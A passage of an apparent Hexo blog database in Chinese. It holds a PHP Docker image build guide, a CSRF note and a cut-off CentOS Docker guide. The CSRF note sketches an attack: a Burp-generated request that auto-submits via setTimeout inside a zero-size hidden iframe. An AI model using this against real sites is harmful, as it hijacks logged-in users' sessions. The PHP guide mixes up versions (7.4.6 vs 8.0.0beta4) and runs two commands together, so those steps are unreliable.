fc1814317609\n```\n\n","slug":"基于Docker制作PHP镜像","published":0,"updated":"2021-03-24T07:35:14.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nd0001icsw7qhr5oth","content":"<p>拉取ubuntu:20.10的镜像</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">docker</span> pull ubuntu:<span class=\"number\">20</span>.<span class=\"number\">10</span></span><br></pre></td></tr></table></figure>\n\n<p>运行一个ubuntu:20.10实例</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">docker</span> run -it ubuntu:<span class=\"number\">20</span>.<span class=\"number\">10</span> /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p>进入实例后运行</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">apt update</span></span><br></pre></td></tr></table></figure>\n\n<p>然后安装必要的基础软件</p>\n<figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install -y sudo vim wget git make gcc pkg-config autoconf libxml2-<span class=\"built_in\">dev</span> libbz2-<span class=\"built_in\">dev</span> libgmp-<span class=\"built_in\">dev</span> openssl libssl-<span class=\"built_in\">dev</span> curl libcurl4-gnutls-<span class=\"built_in\">dev</span> libzip-<span class=\"built_in\">dev</span> libmemcached-<span class=\"built_in\">dev</span> libjpeg-<span class=\"built_in\">dev</span> libpng-<span class=\"built_in\">dev</span> libfreetype6-<span class=\"built_in\">dev</span> libwebp-<span class=\"built_in\">dev</span> sqlite3 libsqlite3-<span class=\"built_in\">dev</span> libtool</span><br></pre></td></tr></table></figure>\n\n<p>php7.4有额外的依赖项目oniguruma</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cd</span></span><br><span class=\"line\">git clone http<span class=\"variable\">s:</span>//github.<span class=\"keyword\">com</span>/kkos/oniguruma.git oniguruma</span><br><span class=\"line\"><span class=\"keyword\">cd</span> oniguruma</span><br><span class=\"line\">./autogen.<span class=\"keyword\">sh</span></span><br><span class=\"line\">./configure</span><br><span class=\"line\"><span class=\"keyword\">make</span></span><br><span class=\"line\"><span class=\"keyword\">make</span> install </span><br></pre></td></tr></table></figure>\n\n<p>到php官网，找到最新版 7.4.6，并下载中国区镜像，解压至根目录</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">cd</span></span><br><span class=\"line\"><span class=\"attribute\">wget</span> https://downloads.php.net/~pollita/php-<span class=\"number\">8</span>.<span class=\"number\">0</span>.<span class=\"number\">0</span>beta<span class=\"number\">4</span>.tar.gz</span><br><span class=\"line\"><span class=\"attribute\">tar</span> -zxvf php-<span class=\"number\">8</span>.<span class=\"number\">0</span>.<span class=\"number\">0</span>beta<span class=\"number\">4</span>.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>查看最新的参数help</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cd</span></span><br><span class=\"line\">php-8.0.0beta4</span><br><span class=\"line\"><span class=\"string\">./configure</span> <span class=\"params\">--help</span></span><br></pre></td></tr></table></figure>\n\n<p>本次更新后参数如下</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">./configure</span> <span class=\"params\">--enable-fpm</span> <span class=\"params\">--with-openssl</span> <span class=\"params\">--with-zlib</span> <span class=\"params\">--enable-bcmath</span> <span class=\"params\">--with-bz2</span> <span class=\"params\">--enable-calendar</span> <span class=\"params\">--with-curl</span> <span class=\"params\">--enable-exif</span> <span class=\"params\">--enable-gd</span> <span class=\"params\">--with-webp</span> <span class=\"params\">--with-jpeg</span> <span class=\"params\">--with-zlib-dir</span> <span class=\"params\">--with-freetype</span> <span class=\"params\">--with-gmp</span> <span class=\"params\">--with-mhash</span> <span class=\"params\">--enable-mbstring</span> <span class=\"params\">--with-mysqli</span> <span class=\"params\">--with-pdo-mysql</span> <span class=\"params\">--enable-shmop</span> <span class=\"params\">--enable-sockets</span> <span class=\"params\">--with-zip</span> <span class=\"params\">--enable-mysqlnd</span> <span class=\"params\">--enable-opcache</span> <span class=\"params\">--with-pear</span></span><br></pre></td></tr></table></figure>\n\n<p>然后make &amp;&amp; make install</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pecl channel-update https:<span class=\"regexp\">//</span>pecl.php.net/channel.xml</span><br></pre></td></tr></table></figure>\n\n<p>然后安装业务所需要的扩展yaf,swoole等</p>\n<p>依次使用pecl install 名称安装需要的扩展</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">igbinary</span></span><br><span class=\"line\"><span class=\"attribute\">msgpack</span></span><br><span class=\"line\"><span class=\"attribute\">memcached</span></span><br><span class=\"line\"><span class=\"attribute\">mongodb</span></span><br><span class=\"line\"><span class=\"attribute\">redis</span></span><br><span class=\"line\"><span class=\"attribute\">swoole</span></span><br><span class=\"line\"><span class=\"attribute\">yaf</span></span><br><span class=\"line\"><span class=\"attribute\">grpc</span></span><br></pre></td></tr></table></figure>\n\n<p>通过php -i看到没有加载任何配置文件</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp <span class=\"regexp\">/root/</span>php-<span class=\"number\">8.0</span>.<span class=\"number\">0</span>beta4<span class=\"regexp\">/php.ini-production /u</span>sr<span class=\"regexp\">/local/</span>lib/php.ini</span><br></pre></td></tr></table></figure>\n\n<p>随后</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim <span class=\"regexp\">/usr/</span>local<span class=\"regexp\">/lib/</span>php.ini</span><br></pre></td></tr></table></figure>\n\n<p>找到如下配置进行修改</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">expose_php</span> = <span class=\"literal\">Off</span></span><br><span class=\"line\"><span class=\"attr\">max_execution_time</span> = <span class=\"number\">60</span></span><br><span class=\"line\"><span class=\"attr\">post_max_size</span> = <span class=\"number\">20</span>M</span><br><span class=\"line\"><span class=\"attr\">upload_max_filesize</span> = <span class=\"number\">20</span>M</span><br><span class=\"line\"><span class=\"attr\">date.timezone</span> = Asia/Shanghai</span><br><span class=\"line\"><span class=\"attr\">opcache.enable</span>=<span class=\"number\">1</span> </span><br></pre></td></tr></table></figure>\n\n<p>随后找地方塞入extension</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">zend_extension</span>=opcache.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=igbinary.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=memcached.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=mongodb.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=msgpack.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=redis.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=swoole.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=yaf.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=grpc.so </span><br></pre></td></tr></table></figure>\n\n<p>然后安装nodejs,参考资料 <a href=\"https://github.com/nodesource/distributions/blob/master/README.md\">https://github.com/nodesource/distributions/blob/master/README.md</a></p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sL http<span class=\"variable\">s:</span>//<span class=\"keyword\">deb</span>.nodesource.<span class=\"keyword\">com</span>/setup_14.<span class=\"keyword\">x</span> | sudo -E bash - sudo apt-<span class=\"built_in\">get</span> install -<span class=\"keyword\">y</span> nodejs</span><br><span class=\"line\">npm config <span class=\"keyword\">set</span> registry http<span class=\"variable\">s:</span>//registry.npm.taobao.org </span><br></pre></td></tr></table></figure>\n\n<p>然后收尾</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">apt</span> clean</span><br><span class=\"line\"><span class=\"attribute\">cd</span></span><br><span class=\"line\"><span class=\"attribute\">rm</span> php-<span class=\"number\">7</span>.<span class=\"number\">4</span>.<span class=\"number\">6</span>.tar.gz</span><br><span class=\"line\"><span class=\"attribute\">rm</span> -rf php-<span class=\"number\">7</span>.<span class=\"number\">4</span>.<span class=\"number\">6</span></span><br><span class=\"line\"><span class=\"attribute\">rm</span> -rf /tmp/pear </span><br></pre></td></tr></table></figure>\n\n<p>然后退出容器 docker commit 后，导出镜像即可</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">docker</span> commit -a <span class=\"string\">&quot;xinxu.lu &lt;lzz@wolou-inc.com&gt;&quot;</span> -m <span class=\"string\">&quot;install php with full extension support and node,npm&quot;</span> <span class=\"number\">4</span>f<span class=\"number\">61</span>a<span class=\"number\">96</span>ceba<span class=\"number\">4</span> bzinc/php<span class=\"number\">80</span>:<span class=\"number\">0</span>.<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"attribute\">docker</span> save -o bzinc_php<span class=\"number\">80</span>_<span class=\"number\">0</span>_<span class=\"number\">0</span>.tar fc<span class=\"number\">1814317609</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>拉取ubuntu:20.10的镜像</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">docker</span> pull ubuntu:<span class=\"number\">20</span>.<span class=\"number\">10</span></span><br></pre></td></tr></table></figure>\n\n<p>运行一个ubuntu:20.10实例</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">docker</span> run -it ubuntu:<span class=\"number\">20</span>.<span class=\"number\">10</span> /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p>进入实例后运行</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">apt update</span></span><br></pre></td></tr></table></figure>\n\n<p>然后安装必要的基础软件</p>\n<figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install -y sudo vim wget git make gcc pkg-config autoconf libxml2-<span class=\"built_in\">dev</span> libbz2-<span class=\"built_in\">dev</span> libgmp-<span class=\"built_in\">dev</span> openssl libssl-<span class=\"built_in\">dev</span> curl libcurl4-gnutls-<span class=\"built_in\">dev</span> libzip-<span class=\"built_in\">dev</span> libmemcached-<span class=\"built_in\">dev</span> libjpeg-<span class=\"built_in\">dev</span> libpng-<span class=\"built_in\">dev</span> libfreetype6-<span class=\"built_in\">dev</span> libwebp-<span class=\"built_in\">dev</span> sqlite3 libsqlite3-<span class=\"built_in\">dev</span> libtool</span><br></pre></td></tr></table></figure>\n\n<p>php7.4有额外的依赖项目oniguruma</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cd</span></span><br><span class=\"line\">git clone http<span class=\"variable\">s:</span>//github.<span class=\"keyword\">com</span>/kkos/oniguruma.git oniguruma</span><br><span class=\"line\"><span class=\"keyword\">cd</span> oniguruma</span><br><span class=\"line\">./autogen.<span class=\"keyword\">sh</span></span><br><span class=\"line\">./configure</span><br><span class=\"line\"><span class=\"keyword\">make</span></span><br><span class=\"line\"><span class=\"keyword\">make</span> install </span><br></pre></td></tr></table></figure>\n\n<p>到php官网，找到最新版 7.4.6，并下载中国区镜像，解压至根目录</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">cd</span></span><br><span class=\"line\"><span class=\"attribute\">wget</span> https://downloads.php.net/~pollita/php-<span class=\"number\">8</span>.<span class=\"number\">0</span>.<span class=\"number\">0</span>beta<span class=\"number\">4</span>.tar.gz</span><br><span class=\"line\"><span class=\"attribute\">tar</span> -zxvf php-<span class=\"number\">8</span>.<span class=\"number\">0</span>.<span class=\"number\">0</span>beta<span class=\"number\">4</span>.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>查看最新的参数help</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cd</span></span><br><span class=\"line\">php-8.0.0beta4</span><br><span class=\"line\"><span class=\"string\">./configure</span> <span class=\"params\">--help</span></span><br></pre></td></tr></table></figure>\n\n<p>本次更新后参数如下</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">./configure</span> <span class=\"params\">--enable-fpm</span> <span class=\"params\">--with-openssl</span> <span class=\"params\">--with-zlib</span> <span class=\"params\">--enable-bcmath</span> <span class=\"params\">--with-bz2</span> <span class=\"params\">--enable-calendar</span> <span class=\"params\">--with-curl</span> <span class=\"params\">--enable-exif</span> <span class=\"params\">--enable-gd</span> <span class=\"params\">--with-webp</span> <span class=\"params\">--with-jpeg</span> <span class=\"params\">--with-zlib-dir</span> <span class=\"params\">--with-freetype</span> <span class=\"params\">--with-gmp</span> <span class=\"params\">--with-mhash</span> <span class=\"params\">--enable-mbstring</span> <span class=\"params\">--with-mysqli</span> <span class=\"params\">--with-pdo-mysql</span> <span class=\"params\">--enable-shmop</span> <span class=\"params\">--enable-sockets</span> <span class=\"params\">--with-zip</span> <span class=\"params\">--enable-mysqlnd</span> <span class=\"params\">--enable-opcache</span> <span class=\"params\">--with-pear</span></span><br></pre></td></tr></table></figure>\n\n<p>然后make &amp;&amp; make install</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pecl channel-update https:<span class=\"regexp\">//</span>pecl.php.net/channel.xml</span><br></pre></td></tr></table></figure>\n\n<p>然后安装业务所需要的扩展yaf,swoole等</p>\n<p>依次使用pecl install 名称安装需要的扩展</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">igbinary</span></span><br><span class=\"line\"><span class=\"attribute\">msgpack</span></span><br><span class=\"line\"><span class=\"attribute\">memcached</span></span><br><span class=\"line\"><span class=\"attribute\">mongodb</span></span><br><span class=\"line\"><span class=\"attribute\">redis</span></span><br><span class=\"line\"><span class=\"attribute\">swoole</span></span><br><span class=\"line\"><span class=\"attribute\">yaf</span></span><br><span class=\"line\"><span class=\"attribute\">grpc</span></span><br></pre></td></tr></table></figure>\n\n<p>通过php -i看到没有加载任何配置文件</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp <span class=\"regexp\">/root/</span>php-<span class=\"number\">8.0</span>.<span class=\"number\">0</span>beta4<span class=\"regexp\">/php.ini-production /u</span>sr<span class=\"regexp\">/local/</span>lib/php.ini</span><br></pre></td></tr></table></figure>\n\n<p>随后</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim <span class=\"regexp\">/usr/</span>local<span class=\"regexp\">/lib/</span>php.ini</span><br></pre></td></tr></table></figure>\n\n<p>找到如下配置进行修改</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">expose_php</span> = <span class=\"literal\">Off</span></span><br><span class=\"line\"><span class=\"attr\">max_execution_time</span> = <span class=\"number\">60</span></span><br><span class=\"line\"><span class=\"attr\">post_max_size</span> = <span class=\"number\">20</span>M</span><br><span class=\"line\"><span class=\"attr\">upload_max_filesize</span> = <span class=\"number\">20</span>M</span><br><span class=\"line\"><span class=\"attr\">date.timezone</span> = Asia/Shanghai</span><br><span class=\"line\"><span class=\"attr\">opcache.enable</span>=<span class=\"number\">1</span> </span><br></pre></td></tr></table></figure>\n\n<p>随后找地方塞入extension</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">zend_extension</span>=opcache.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=igbinary.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=memcached.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=mongodb.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=msgpack.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=redis.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=swoole.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=yaf.so</span><br><span class=\"line\"><span class=\"attr\">extension</span>=grpc.so </span><br></pre></td></tr></table></figure>\n\n<p>然后安装nodejs,参考资料 <a href=\"https://github.com/nodesource/distributions/blob/master/README.md\">https://github.com/nodesource/distributions/blob/master/README.md</a></p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sL http<span class=\"variable\">s:</span>//<span class=\"keyword\">deb</span>.nodesource.<span class=\"keyword\">com</span>/setup_14.<span class=\"keyword\">x</span> | sudo -E bash - sudo apt-<span class=\"built_in\">get</span> install -<span class=\"keyword\">y</span> nodejs</span><br><span class=\"line\">npm config <span class=\"keyword\">set</span> registry http<span class=\"variable\">s:</span>//registry.npm.taobao.org </span><br></pre></td></tr></table></figure>\n\n<p>然后收尾</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">apt</span> clean</span><br><span class=\"line\"><span class=\"attribute\">cd</span></span><br><span class=\"line\"><span class=\"attribute\">rm</span> php-<span class=\"number\">7</span>.<span class=\"number\">4</span>.<span class=\"number\">6</span>.tar.gz</span><br><span class=\"line\"><span class=\"attribute\">rm</span> -rf php-<span class=\"number\">7</span>.<span class=\"number\">4</span>.<span class=\"number\">6</span></span><br><span class=\"line\"><span class=\"attribute\">rm</span> -rf /tmp/pear </span><br></pre></td></tr></table></figure>\n\n<p>然后退出容器 docker commit 后，导出镜像即可</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">docker</span> commit -a <span class=\"string\">&quot;xinxu.lu &lt;lzz@wolou-inc.com&gt;&quot;</span> -m <span class=\"string\">&quot;install php with full extension support and node,npm&quot;</span> <span class=\"number\">4</span>f<span class=\"number\">61</span>a<span class=\"number\">96</span>ceba<span class=\"number\">4</span> bzinc/php<span class=\"number\">80</span>:<span class=\"number\">0</span>.<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"attribute\">docker</span> save -o bzinc_php<span class=\"number\">80</span>_<span class=\"number\">0</span>_<span class=\"number\">0</span>.tar fc<span class=\"number\">1814317609</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"简历","toc":false,"date":"2021-03-26T01:16:34.000Z","description":null,"_content":"\n","source":"_drafts/简历.md","raw":"---\ntitle: 简历\ntoc: false\ndate: 2021-03-26 09:16:34\ndescription:\ntags:\ncategories:\n---\n\n","slug":"简历","published":0,"updated":"2021-03-26T01:16:34.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nf0002icswaao2g7bt","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"CSRF","toc":false,"date":"2021-03-24T07:54:30.000Z","description":"CSRF","_content":"\n## 0x01 CSRF原理\n\n跨站请求伪造，就是访问恶意网站时运行恶意网站上加载的JS，然后对一个已经登录的正常网站发送数据包，达到篡改信息、修改配置等功能。\n\n## 0x02 CSRF必要条件\n\n- 没有Token防御\n- 知道目标站点需要传的恶意数据\n\n## 0x03 防御手段\n\n### Token本质\n\n一串无规律的随机值\n\n### Token机制\n\n登录网站后，有Token机制的服务器会生成一串包含着Token的Cookie。\n\n如果网页访问没有Token基本上就可以认定它存在CSRF，校验是必要的，必须要将CSRF打出来才能证明它存在\n\n## 0x04 流程\n\n- 利用Burp快速生成CSRF攻击数据包，将之复制到一个html文件中就可以让用户访问进行攻击\n\n- 将生成的攻击数据包的点击生效修改成延时100ms自动执行submitRequest函数\n\n- - setTimeout(submitRequest(),100)，加在JS最后即可\n  - 利用iframe嵌入搭建的网站，使人访问即可访问到CSRF的html文件\n    - `<iframe src=\"***.html\" height=0 width=0 />`","source":"_posts/CSRF.md","raw":"---\ntitle: CSRF\ntoc: false\ndate: 2021-03-24 15:54:30\ndescription: CSRF\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 CSRF原理\n\n跨站请求伪造，就是访问恶意网站时运行恶意网站上加载的JS，然后对一个已经登录的正常网站发送数据包，达到篡改信息、修改配置等功能。\n\n## 0x02 CSRF必要条件\n\n- 没有Token防御\n- 知道目标站点需要传的恶意数据\n\n## 0x03 防御手段\n\n### Token本质\n\n一串无规律的随机值\n\n### Token机制\n\n登录网站后，有Token机制的服务器会生成一串包含着Token的Cookie。\n\n如果网页访问没有Token基本上就可以认定它存在CSRF，校验是必要的，必须要将CSRF打出来才能证明它存在\n\n## 0x04 流程\n\n- 利用Burp快速生成CSRF攻击数据包，将之复制到一个html文件中就可以让用户访问进行攻击\n\n- 将生成的攻击数据包的点击生效修改成延时100ms自动执行submitRequest函数\n\n- - setTimeout(submitRequest(),100)，加在JS最后即可\n  - 利用iframe嵌入搭建的网站，使人访问即可访问到CSRF的html文件\n    - `<iframe src=\"***.html\" height=0 width=0 />`","slug":"CSRF","published":1,"updated":"2021-03-24T07:54:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nh0005icsw8jo6ggms","content":"<h2 id=\"0x01-CSRF原理\"><a href=\"#0x01-CSRF原理\" class=\"headerlink\" title=\"0x01 CSRF原理\"></a>0x01 CSRF原理</h2><p>跨站请求伪造，就是访问恶意网站时运行恶意网站上加载的JS，然后对一个已经登录的正常网站发送数据包，达到篡改信息、修改配置等功能。</p>\n<h2 id=\"0x02-CSRF必要条件\"><a href=\"#0x02-CSRF必要条件\" class=\"headerlink\" title=\"0x02 CSRF必要条件\"></a>0x02 CSRF必要条件</h2><ul>\n<li>没有Token防御</li>\n<li>知道目标站点需要传的恶意数据</li>\n</ul>\n<h2 id=\"0x03-防御手段\"><a href=\"#0x03-防御手段\" class=\"headerlink\" title=\"0x03 防御手段\"></a>0x03 防御手段</h2><h3 id=\"Token本质\"><a href=\"#Token本质\" class=\"headerlink\" title=\"Token本质\"></a>Token本质</h3><p>一串无规律的随机值</p>\n<h3 id=\"Token机制\"><a href=\"#Token机制\" class=\"headerlink\" title=\"Token机制\"></a>Token机制</h3><p>登录网站后，有Token机制的服务器会生成一串包含着Token的Cookie。</p>\n<p>如果网页访问没有Token基本上就可以认定它存在CSRF，校验是必要的，必须要将CSRF打出来才能证明它存在</p>\n<h2 id=\"0x04-流程\"><a href=\"#0x04-流程\" class=\"headerlink\" title=\"0x04 流程\"></a>0x04 流程</h2><ul>\n<li><p>利用Burp快速生成CSRF攻击数据包，将之复制到一个html文件中就可以让用户访问进行攻击</p>\n</li>\n<li><p>将生成的攻击数据包的点击生效修改成延时100ms自动执行submitRequest函数</p>\n</li>\n<li><ul>\n<li>setTimeout(submitRequest(),100)，加在JS最后即可</li>\n<li>利用iframe嵌入搭建的网站，使人访问即可访问到CSRF的html文件<ul>\n<li><code>&lt;iframe src=&quot;***.html&quot; height=0 width=0 /&gt;</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-CSRF原理\"><a href=\"#0x01-CSRF原理\" class=\"headerlink\" title=\"0x01 CSRF原理\"></a>0x01 CSRF原理</h2><p>跨站请求伪造，就是访问恶意网站时运行恶意网站上加载的JS，然后对一个已经登录的正常网站发送数据包，达到篡改信息、修改配置等功能。</p>\n<h2 id=\"0x02-CSRF必要条件\"><a href=\"#0x02-CSRF必要条件\" class=\"headerlink\" title=\"0x02 CSRF必要条件\"></a>0x02 CSRF必要条件</h2><ul>\n<li>没有Token防御</li>\n<li>知道目标站点需要传的恶意数据</li>\n</ul>\n<h2 id=\"0x03-防御手段\"><a href=\"#0x03-防御手段\" class=\"headerlink\" title=\"0x03 防御手段\"></a>0x03 防御手段</h2><h3 id=\"Token本质\"><a href=\"#Token本质\" class=\"headerlink\" title=\"Token本质\"></a>Token本质</h3><p>一串无规律的随机值</p>\n<h3 id=\"Token机制\"><a href=\"#Token机制\" class=\"headerlink\" title=\"Token机制\"></a>Token机制</h3><p>登录网站后，有Token机制的服务器会生成一串包含着Token的Cookie。</p>\n<p>如果网页访问没有Token基本上就可以认定它存在CSRF，校验是必要的，必须要将CSRF打出来才能证明它存在</p>\n<h2 id=\"0x04-流程\"><a href=\"#0x04-流程\" class=\"headerlink\" title=\"0x04 流程\"></a>0x04 流程</h2><ul>\n<li><p>利用Burp快速生成CSRF攻击数据包，将之复制到一个html文件中就可以让用户访问进行攻击</p>\n</li>\n<li><p>将生成的攻击数据包的点击生效修改成延时100ms自动执行submitRequest函数</p>\n</li>\n<li><ul>\n<li>setTimeout(submitRequest(),100)，加在JS最后即可</li>\n<li>利用iframe嵌入搭建的网站，使人访问即可访问到CSRF的html文件<ul>\n<li><code>&lt;iframe src=&quot;***.html&quot; height=0 width=0 /&gt;</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n"},{"title":"CentOS8下安装Docker","toc":false,"date":"2021-03-24T07:39:36.000Z","description":"CentOS8下安装Docker","_content":"\n## 0x01 使用存储库安装\n\n### 设置存储库\n\n安装yum-utils软件包并设置**稳定的**存储库。\n\n```\n$ sudo yum install -y yum-utils\n$ sudo yum-config-manager \\\n    --add-repo \\\n    https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n```\n\n### 